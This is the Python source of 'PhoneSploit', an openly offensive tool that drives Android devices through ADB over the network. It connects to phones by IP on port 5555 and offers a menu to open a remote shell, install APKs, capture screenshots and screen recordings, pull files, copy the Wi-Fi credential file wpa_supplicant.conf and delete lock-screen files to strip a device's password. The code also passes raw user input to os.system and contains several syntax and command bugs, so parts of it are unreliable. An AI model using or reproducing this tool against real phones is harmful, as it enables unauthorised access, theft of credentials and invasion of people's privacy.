#Coded By Zucccs
#ADB Shell Simplified
#Updated to Python Version 3 by MIMachakata
# Enjoy


#=============================
#Imports

import os
import random
import urllib
import urllib.request
#import urllib2 Zucccs not working
import time as t
try:
    from colorama import Fore, init
except ModuleNotFound:
    print("Please install The Colorama Module")
#TIP: you may have to install the above import "colorama"
#=============================
# Variables
CurrentDir = os.path.dirname(os.path.abspath(__file__))
load_count = 0
#=================Depreciated Functions=========================
#   raw_input("")
#   import urllib2
#   from colorama | fixing & auto installation
#===============================================================
#==============MODS by MIMAchakata | Alt Studios================
#   1. Screenshot name
#   2. Title
#   3. Screen Recording Name
#=============================
#Install Functions
# def ColoringModeStartup():
#     coloring_file = open(CurrentDir+"\\install\\coloring.txt", "a+")
#     line = open(CurrentDir+"\\install\\coloring.txt", "a+").readline()
#     if 'true' in line:
#         init(convert=True)
#         main()
#     if 'false' in line:
#         windows=False
#         main()
#     if "NOT_LOADED" in line:
#         platform_choice = input("Are you loading this script in (W)indows or (L)inux: ")
#         open(CurrentDir+"\\install\\coloring.txt", "w").close()
#         if platform_choice.lower() == 'w':
#             coloring_file.write("true")
#         else:
#             coloring_file.write("false")
#             yn = input( + "Have you already installed adb via command line "+"Y"++"/"++"N "+)
#             if yn == "n":
#                 cmd("sudo apt install adb")
#             else:
#                 main()

#=============================
# Graphics # http://patorjk.com/software/taag/#p=display&f=Graffiti&t=Type%20Something%20

arrow =  "->" 
connect =  "|"
curr = ""
default_device = True
page2 = False

logo_design_1 = ('''
    ____  __                    _____       __      _ __
   / __ \/ /_  ____  ____  ___ / ___/____  / /___  (_) /_
  / /_/ / __ \/ __ \/ __ \/ _ \\__ \/ __ \ / / __ \/ / __/
 / ____/ / / / /_/ / / / /  __/__/ / /_/ / / /_/ / / /_
/_/   /_/ /_/\____/_/ /_/\___/____/ .___/_/\____/_/\__/
                                 /_/''')#(, , )

logo_design_2 = '''
  .;'                     `;,
 .;'  ,;'             `;,  `;,   PhoneSploit
.;'  ,;'  ,;'     `;,  `;,  `;,
::   ::   :   ( )   :   ::   ::  Coded by Zucccs / Metachar 
':.  ':.  ':. /_\ ,:'  ,:'  ,:'   | Kindly Modified by MIMachakata
 ':.  ':.    /___\    ,:'  ,:'
  ':.       /_____\      ,:'
           /       \\
'''#(, , )
#Logo_design_pre not working well on some windows
#logo_design_pre = '''
#ââââ¬ â¬ââââââââââââââââ¬  ââââ¬ââ¬â
#â âââââ¤â ââââââ¤ âââââââ  â ââ â
#3â©  â´ â´âââââââââââââ´  â´ââââââ´ â´ '''(, , )
#logo_design_3 = logo_design_pre.decode("utf-8")
logo_design_3 = '''
╔═╗┬ ┬┌─┐┌┐┌┌─┐╔═╗┌─┐┬  ┌─┐┬┌┬┐
╠═╝├─┤│ ││││├┤ ╚═╗├─┘│  │ ││ │
╩  ┴ ┴└─┘┘└┘└─┘╚═╝┴  ┴─┘└─┘┴ ┴ '''#

logo_design_4 = '''
\033[92m
          +hydNNNNdyh+
        +mMMMMMMMMMMMMm+
      `dMMm\033[0m:\033[92mNMMMMMMN\033[0m:\033[92mmMMd`
      hMMMMMMMMMMMMMMMMMMh
  \033[92m..  yyyyyyyyyyyyyyyyyyyy  ..              \033[0m Expoit time :) \033[92m
\033[92m.mMMm`MMMMMMMMMMMMMMMMMMMM`mMMm.            \033[0m Thanks for downloading!\033[92m
\033[92m:MMMM-MMMMMMMMMMMMMMMMMMMM-MMMM:
:MMMM-MMMMMMMMMMMMMMMMMMMM-MMMM:
:MMMM-MMMMMMMMMMMMMMMMMMMM-MMMM:
:MMMM-MMMMMMMMMMMMMMMMMMMM-MMMM:
-MMMM-MMMMMMMMMMMMMMMMMMMM-MMMM-
 +yy+ MMMMMMMMMMMMMMMMMMMM +yy+
      mMMMMMMMMMMMMMMMMMMm
      `/++MMMMh++hMMMM++/`
          MMMMo  oMMMM
          MMMMo  oMMMM
          oNMm-  -mMNs'''

logo_design_5 = '''
 ______   __  __     _______     __   __     ______     ______     ______   __         ______     __     ______
/\  == \ /\ \_\ \   /\  __  \   /\ "-.\ \   /\  ___\   /\  ___\   /\  == \ /\ \       /\  __ \   /\ \   /\__  _\
\ \  _-/ \ \  __ \  \ \ \_/\ \  \ \ \-.  \  \ \  __\   \ \___  \  \ \  _-/ \ \ \____  \ \ \/\ \  \ \ \  \/_/\ \/
 \ \_\    \ \_\ \_\  \ \______\  \ \_\\ "\_\  \ \_____\  \/\_____\  \ \_\    \ \_____\  \ \_____\  \ \_\    \ \_\
  \/_/     \/_/\/_/   \/_____ /   \/_/ \/_/   \/_____/   \/_____/   \/_/     \/_____/   \/_____/   \/_/     \/_/
'''#

logo_design_6 =  '''
                      ,____
                      |---.\\
              ___     |    `      PHONESPLOIT
             / .-\  ./=)
            |  |"|_/\/|
            ;  |-;| /_|         REAP THE REWARDS
           / \_| |/ \ |
          /      \/\( |
          |   /  |` ) |
          /   \ _/    |
         /--._/  \    |
         `/|)    |    /
           /     |   |
         .'      |   |
        /         \  |
       (_.-.__.__./  /

'''

logo_design_7 = '''
    .o oOOOOOOOo                                            OOOo
    Ob.OOOOOOOo  OOOo.      oOOo.                      .adOOOOOOO
    OboO"""""""""""".OOo. .oOOOOOo.    OOOo.oOOOOOo.."""""""""'OO
    OOP.oOOOOOOOOOOO "POOOOOOOOOOOo.   `"OOOOOOOOOP,OOOOOOOOOOOB'
    `O'OOOO'     `OOOOo"OOOOOOOOOOO` .adOOOOOOOOO"oOOO'    `OOOOo
    .OOOO'            `OOOOOOOOOOOOOOOOOOOOOOOOOO'            `OO
    OOOOO                 '"OOOOOOOOOOOOOOOO"`                oOO
   oOOOOOba.                .adOOOOOOOOOOba               .adOOOOo.
  oOOOOOOOOOOOOOba.    .adOOOOOOOOOO@^OOOOOOOba.     .adOOOOOOOOOOOO
 OOOOOOOOOOOOOOOOO.OOOOOOOOOOOOOO"`  '"OOOOOOOOOOOOO.OOOOOOOOOOOOOO
 "OOOO"       "YOoOOOOMOIONODOO"`  .   '"OOROAOPOEOOOoOY"     "OOO"
    Y           'OOOOOOOOOOOOOO: .oOOo. :OOOOOOOOOOO?'         :`
    :            .oO%OOOOOOOOOOo.OOOOOO.oOOOOOOOOOOOO?         .
    .            oOOP"%OOOOOOOOoOOOOOOO?oOOOOO?OOOO"OOo
                 '%o  OOOO"%OOOO%"%OOOOO"OOOOOO"OOO':
                      `$"  `OOOO' `O"Y ' `OOOO'  o             .
    .                  .     OP"          : o     .

'''

page_1 = '''\n
[1] Show Connected Devices      [6] Screen record a phone               [11] Uninstall an app
[2] Disconect all devices       [7] Screen Shot a picture on a phone    [12] Show real time log of device
[3] Connect a new phone (IP)    [8] Restart Server                      [13] Dump System Info
[4] Access Shell on a phone     [9] Pull folders from phone to pc       [14] List all apps on a phone
[5] Install an apk on a phone   [10] Turn The Device off                [15] Run an app


[99] Exit   [0] Clear   [n] Next Page                           v1.2.1M
'''

page_2 = '''\n
[16] Port Forwarding                [21] NetStat
[17] Grab wpa_supplicant            [22] Turn WiFi On/Off
[18] Show Mac/Inet                  [23] Remove Password
[19] Extract apk from app           [24] Use Keycode
[20] Get Battery Status             [25] Get Current Activity


[99] Exit   [0] Clear   [b] Back to page one
'''


#=============================
#Main
def main():
    cmd("color a")
    global device_name
    page_num = 1
    print("------------------------------------------------------------------------------------------------------------------")
    option = input ("PhoneSploit" +  "(main_menu) " +  "> ")
    #option = input("PhoneSploit> ")
    if option == '1':
        print("Device Name")
        cmd("adb devices -l")
    elif option  ==  '2':
        cmd("adb disconnect")
    elif option == '3':
        cmd("adb tcpip 5555")
        print (("\n[+] Enter a phones ip address."))
        ip = input (arrow+" phonesploit"+ "(connect_phone) "+"> ")
        cmd("adb connect "+ip+":5555")

    elif option  == '4':
        print (("\n[+]Enter a device name."))
        device_name = input(arrow + "phonesploit"+ "(shell_on_phone) "+"> ")
        cmd("adb -s "+device_name+" shell")

    elif option == '5':
        #if(default_device):
        print (("\n[+]Enter a device name."))
        device_name = input(arrow + "phonesploit"+ "(apk_install) "+"> ")
        print (("     "+connect))
        print (("    [+]Enter the apk location without app extension\neg. C:/Users/my_app"))
        apk_location = input("    "+arrow + "phonesploit"+ "(apk_install) "+"> ")
        apk_location += ".apk"
        cmd("adb -s  "+device_name+" install "+apk_location)
        print (apk_location+"Apk has been installed.")

    elif option ==  '6':
        #if(default_device):
        print (("\n[+]Enter a device name."))
        device_name = input(arrow + "phonesploit"+ "(screen_record) "+"> ")
        print (("[+]\tEnter the name of your video "))
        video_name = input(arrow + "phonesploit (screen_recording_name) ")
        print (("     "+connect))
        print (("    [+] Please wait 3m its recording"))
        print (("     "+connect))
        cmd("adb -s "+device_name+" shell screenrecord /sdcard/" + video_name + ".mp4")
        print (("    [+]Enter where you would like the video to be saved."))
        place_location = input("    "+arrow + "phonesploit"+ "(screen_record) "+"> ")
        cmd("adb -s "+device_name+" pull /sdcard/" +  video_name + ".mp4 "+place_location)
        cmd("adb -s "+device_name+"rm /sdcard/"+video_name+".mp4")

    elif option  == '7':
        #if(default_device):
        print (("\n[+]Enter a device name."))
        device_name = input(arrow + "phonesploit"+ "(screenshot) "+"> ")
        screen_shot_name = device_name
        cmd("adb -s "+device_name+" shell screencap /sdcard/" + screen_shot_name + ".png")
        print (("     "+connect))
        print (("    [+]Enter where you would like the screenshot to be saved."))
        place_location = input("    "+arrow + "phonesploit"+ "(screenshot) "+"> ")
        cmd("adb -s "+device_name+" pull /sdcard/" + screen_shot_name + ".png "+place_location)
        cmd("adb -s "+device_name+" rm /sdcard/"+screen_shot_name+".png")

    elif option == '8':
        cmd("adb kill-server && adb start-server")

    elif option == '9':
        #if(default_device):
        print (("\n[+]Enter a device name."))
        device_name = input(arrow + "phonesploit"+ "(file_pull) "+"> ")
        print (("     "+connect))
        print (("    [+]Enter a file location on a device"))
        file_location = input("    "+arrow + "phonesploit"+ "(file_pull) "+"> ")
        print (("        "+connect))
        print (("       [+]Enter where you would like the file to be saved."))
        place_location = input("       "+arrow + "phonesploit"+ "(file_pull) "+"> ")
        cmd("adb -s "+device_name+" pull "+file_location+" "+place_location)

    elif option == '10':
        #if(default_device):
        print (("\n[+]Enter a device name."))
        device_name = input(arrow + "phonesploit"+ "(device_reboot) "+"> ")
        cmd("adb -s "+device_name+ " reboot ")

    elif option ==  '11':
        #if(default_device):
        print (("\n[+]Enter a device name."))
        device_name = input(arrow + "phonesploit"+ "(app_delete) "+"> ")
        print (("     "+connect))
        print (("    [+]Enter a package name."))
        package_name = input("    "+arrow + "phonesploit"+ "(app_delete) "+"> ")
        cmd("adb -s "+device_name+" uninstall "+package_name)

    elif option == '12':
        #if(default_device):
        print (("\n[+]Enter a device name."))
        device_name = input(arrow + "phonesploit"+ "(log) "+"> ")
        print("Please Note: This command will run untill you press Ctrl C")
        t.sleep(3)
        try:
            print("Logging data to file"+device_name+"_real_time_log.txt in adb folder\n")
            cmd("adb -s "+device_name+" logcat> "+ device_name +"_real_time_log.txt")
            print("\nFile saved as real_time_log.txt in adb folder of program...!")
        except KeyboardInterrupt:
            print("You cancelled the operation.")

    elif option == '13':
        print (("\n[+]Enter a device name."))
        device_name = input(arrow + "phonesploit"+ "(sys_info) "+"> ")
        print("This can be stopped by pressing Ctrl + C")
        t.sleep(4)
        cmd("adb -s "+device_name+" dumpsys")

    elif option == '14':
        print (("\n[+]Enter a device name."))
        device_name = input(arrow + "phonesploit"+ "(package_manager) "+"> ")
        try:
            cmd("adb -s " +device_name+ " shell pm list packages -f")
            cmd("adb -s " + device_name + "shell pm list packages -f > "+device_name+"app_lists.txt")
            print("File saved in folder adb as "+device_name+"_app_lists.txt")
        except:
            print("An error occured. Try again")
        main()

    elif option == '15':
        print (("\n[+]Enter a device name."))
        device_name = input(arrow + "phonesploit"+ "(app_run) "+"> ")
        print (("     "+connect))
        print (("    [+]Enter a package name. They look like this --> com.snapchat.android"))
        try:
            package_name = input("    "+arrow + "phonesploit"+ "(app_run) "+"> ")
            cmd("adb -s "+device_name+" shell monkey -p "+package_name+" -v 500")
        except KeyboardInterrupt:
            print("Exiting from shell")
        except TypeError:
            print("An error occured, make sure your device is still connected.")
        main()

    elif option == '16':
        #if(default_device):
        print (("\n[+]Enter a device name."))
        device_name = input(arrow + "phonesploit"+ "(port_forward)> ")
        print (("     "+connect))
        print (("    [+]Enter a port on the device."))
        port_device = input("    "+arrow + "phonesploit"+ "(port_forward) ")
        print (("         "+connect))
        print (("        [+]Enter a port to forward it too."))
        forward_port = input("        "+arrow + "phonesploit"+ "(port_forward)> ")
        cmd("adb -s "+device_name+" forward tcp:"+port_device+" tcp:"+forward_port)
    elif option == '17':
        try:
            print (("[+]Enter a device name."))
            device_name = input(arrow + "phonesploit"+ "(wpa_grab) "+"> ")
            print (( + "    [+]THE DEVICE NEEDS TO BE ROOTED TO CONTINUE TO EXIT USE CTRL +C"))
            print (("     "+connect))
            print (("    [+]Enter where you want the file to be saved."))
            location = input("    "+arrow + "phonesploit"+ "(wpa_grab) "+"> ")
            cmd("adb -s "+device_name+" shell "+"su -c 'cp /data/misc/wifi/wpa_supplicant.conf /sdcard/'")
            cmd("adb -s "+device_name+" pull /sdcard/wpa_supplicant.conf "+location)
            cmd("adb -s "+device_name+"rm /sdcard/wpa_supplicant.conf")
        except KeyboardInterrupt:
            print("You cancelled the operation")
        main()

    elif option == '18':
        print (("\n[+]Enter a device name."))
        device_name = input(arrow + "phonesploit"+ "(mac_inet) "+"> ")
        cmd("adb -s " +device_name+ " shell ip address show wlan0")
        main()

    elif option == '19':
        #if(default_device):
        print (("\n[+]Enter a device name."))
        device_name = input(arrow + "phonesploit"+ "(pull_apk)> ")
        print (("     "+connect))
        print (("    [+]Enter a package name. They look like this --> com.snapchat.android"))
        package_name = input("    "+arrow + "phonesploit"+ "(pull_apk) "+"> ")
        cmd("adb -s "+device_name+" shell pm path "+package_name)
        print (("         "+connect))
        print (("        [+]Enter The path.looks like this /data/app/com.snapchat.android==/base.apk"))
        path = input("        "+arrow + "phonesploit"+ "(pull_apk) "+"> ")
        print (("             "+connect))
        print (("            [+]Enter The location to store the apk: ")  )
        location =   input("            "+arrow + "phonesploit"+ "(pull_apk) "+"> ")
        cmd("adb -s " +device_name+" pull "+path+" "+location)
        main()

    elif option == '20':
        #if(default_device):
        print (("\n[+]Enter a device name."))
        device_name = input(arrow + "phonesploit"+ "(battery) "+"> ")
        cmd("adb -s " +device_name+ " shell dumpsys battery")
        main()

    elif option == '21':
        #if(default_device):
        print (("\n[+]Enter a device name."))
        device_name = input(arrow + "phonesploit"+ "(net_stat) "+"> ")
        cmd("adb -s " +device_name+ " shell netstat")
        main()

    elif option == '22':
        #if(default_device):
        print (("\n[+]Enter a device name."))
        device_name = input(arrow + "phonesploit"+ "(wifi) "+"> ")
        print (("     "+connect))
        print (("    [+] To turn wifi back on you need the device to be pluged in."))
        print (("     "+connect))
        on_off = input("    ["+"+"+"]Would you like the wifi "+"on"+"/"+"off ")
        if on_off.lower() == 'off':
            command = " shell svc wifi disable"
        else:
            command = " shell svc wifi enable"

        cmd("adb -s "+device_name+command)

    elif option == '23':
        #if(default_device):
        print (("[+]Enter a device name."))
        device_name = input(arrow + "phonesploit"+ "(pass_remove) "+"> ")
        print (( + "    [+]THE DEVICE NEEDS TO BE ROOTED TO CONTINUE TO EXIT USE CTRL +C THIS IS ALSO UNTESTED"))
        print (("     "+connect))
        try:
            print ( "******************TRYING TO REMOVE PASS******************")
            cmd("adb -s "+device_name+" shell su 0 'rm /data/system/gesture.key'")
            cmd("adb -s "+device_name+" shell su 0 'rm /data/system/locksettings.db'")
            cmd("adb -s "+device_name+" shell su 0 'rm /data/system/locksettings.db-wal'")
            cmd("adb -s "+device_name+" shell su 0 'rm /data/system/locksettings.db-shm'")
            print ( "******************TRYING TO REMOVE PASS******************")
        except:
            print("*******An Error Occured, Make Sure the Phone is Rooted*********")
        finally:
            main()

    elif option == '24':
        #if(default_device):
        print (("[+]Enter a device name."))
        device_name = input(arrow + "phonesploit"+ "(keycode) "+"> ")
        print ('''
0 -->  "KEYCODE_UNKNOWN"
1 -->  "KEYCODE_MENU"
2 -->  "KEYCODE_SOFT_RIGHT"
3 -->  "KEYCODE_HOME"
4 -->  "KEYCODE_BACK"
5 -->  "KEYCODE_CALL"
6 -->  "KEYCODE_ENDCALL"
7 -->  "KEYCODE_0"
8 -->  "KEYCODE_1"
9 -->  "KEYCODE_2"
10 -->  "KEYCODE_3"
11 -->  "KEYCODE_4"
12 -->  "KEYCODE_5"
13 -->  "KEYCODE_6"
14 -->  "KEYCODE_7"
15 -->  "KEYCODE_8"
16 -->  "KEYCODE_9"
17 -->  "KEYCODE_STAR"
18 -->  "KEYCODE_POUND"
19 -->  "KEYCODE_DPAD_UP"
20 -->  "KEYCODE_DPAD_DOWN"
21 -->  "KEYCODE_DPAD_LEFT"
22 -->  "KEYCODE_DPAD_RIGHT"
23 -->  "KEYCODE_DPAD_CENTER"
24 -->  "KEYCODE_VOLUME_UP"
25 -->  "KEYCODE_VOLUME_DOWN"
26 -->  "KEYCODE_POWER"
27 -->  "KEYCODE_CAMERA"
28 -->  "KEYCODE_CLEAR"
29 -->  "KEYCODE_A"
30 -->  "KEYCODE_B"
31 -->  "KEYCODE_C"
32 -->  "KEYCODE_D"
33 -->  "KEYCODE_E"
34 -->  "KEYCODE_F"
35 -->  "KEYCODE_G"
36 -->  "KEYCODE_H"
37 -->  "KEYCODE_I"
38 -->  "KEYCODE_J"
39 -->  "KEYCODE_K"
40 -->  "KEYCODE_L"
41 -->  "KEYCODE_M"
42 -->  "KEYCODE_N"
43 -->  "KEYCODE_O"
44 -->  "KEYCODE_P"
45 -->  "KEYCODE_Q"
46 -->  "KEYCODE_R"
47 -->  "KEYCODE_S"
48 -->  "KEYCODE_T"
49 -->  "KEYCODE_U"
50 -->  "KEYCODE_V"
51 -->  "KEYCODE_W"
52 -->  "KEYCODE_X"
53 -->  "KEYCODE_Y"
54 -->  "KEYCODE_Z"
55 -->  "KEYCODE_COMMA"
56 -->  "KEYCODE_PERIOD"
57 -->  "KEYCODE_ALT_LEFT"
58 -->  "KEYCODE_ALT_RIGHT"
59 -->  "KEYCODE_SHIFT_LEFT"
60 -->  "KEYCODE_SHIFT_RIGHT"
61 -->  "KEYCODE_TAB"
62 -->  "KEYCODE_SPACE"
63 -->  "KEYCODE_SYM"
64 -->  "KEYCODE_EXPLORER"
65 -->  "KEYCODE_ENVELOPE"
66 -->  "KEYCODE_ENTER"
67 -->  "KEYCODE_DEL"
68 -->  "KEYCODE_GRAVE"
69 -->  "KEYCODE_MINUS"
70 -->  "KEYCODE_EQUALS"
71 -->  "KEYCODE_LEFT_BRACKET"
72 -->  "KEYCODE_RIGHT_BRACKET"
73 -->  "KEYCODE_BACKSLASH"
74 -->  "KEYCODE_SEMICOLON"
75 -->  "KEYCODE_APOSTROPHE"
76 -->  "KEYCODE_SLASH"
77 -->  "KEYCODE_AT"
78 -->  "KEYCODE_NUM"
79 -->  "KEYCODE_HEADSETHOOK"
80 -->  "KEYCODE_FOCUS"
81 -->  "KEYCODE_PLUS"
82 -->  "KEYCODE_MENU"
83 -->  "KEYCODE_NOTIFICATION"
84 -->  "KEYCODE_SEARCH"
85 -->  "TAG_LAST_KEYCODE"
        ''')
        print (("[+]Enter a number.")())
        num = input(arrow + "phonesploit"+ "(keycode) "+"> ")
        cmd("adb -s "+device_name+" shell input keyevent "+num)

    elif option == '25':
        #if(default_device):
        print (("\n[+]Enter a device name."))
        device_name = input(arrow + "phonesploit"+ "(current_activity) "+"> ")
        try:
            cmd("adb -s " +device_name+ " dumpsys activity > current_sys_activity.txt")
            print("Log saved as current_sys_actvity.txt in Current_Folder/adb folder")
        except:
            print("An error occured, check your Device Name OR Status")
        main()

    elif option == '0':
        global page2
        if page2 == True:
            clear(page_2)
        else:
            clear(page_1)

    elif option.lower() == 'n':
        cmd('cls')
        page2 = True
        banner_title = random.choice([logo_design_1,logo_design_2,logo_design_6,logo_design_4,logo_design_5,logo_design_3])
        print ( banner_title)
        print (page_2)

    elif option.lower() == 'b':
        cmd('cls')
        page2 = False
        banner_title = random.choice([logo_design_1,logo_design_2,logo_design_4,logo_design_3])
        print ( banner_title)
        print (page_1)

    elif option.lower() == 'set default':
        print("You can view the device name via on option 1.")
        curr = input("\tPhoneSploit> Enter Current/Default Device Name: ")
        if (curr != ""):
            defult_device = False
            print("Default device successfully set.\nEnjoy!!!")
        else:
            default_device = True
            print("Couldn't set a default device.")

    elif option.lower() == 'clear default':
        default_device = False

    elif option == '99':
        cmd("color 7")
        exit()


    main()

#=============================

def clear(page):
    global page2
    cmd('cls')
    banner_title = random.choice([logo_design_1,logo_design_2,logo_design_4,logo_design_5,logo_design_6,logo_design_7,logo_design_3])
    print ( banner_title)
    print (page)

def cmd(s):
    os.system(s)


#=============================
# Run
try:
    #init(convert=True)
    os.chdir(CurrentDir+"//adb")
    cmd("title PhoneSploit")
    print ( "Starting  adb server..")
    cmd("adb tcpip 5555")
    t.sleep(4)
    cmd('cls')
    banner_title = random.choice([logo_design_1,logo_design_2,logo_design_4,logo_design_5,logo_design_6,logo_design_7,logo_design_3])
    print ( banner_title)
    print (page_1)
    main()
except KeyboardInterrupt:
    main()
#Special Thanks to Zucccs for craetively thinking of creating this.
#ADB is a Respective Copyright of Google Inc.
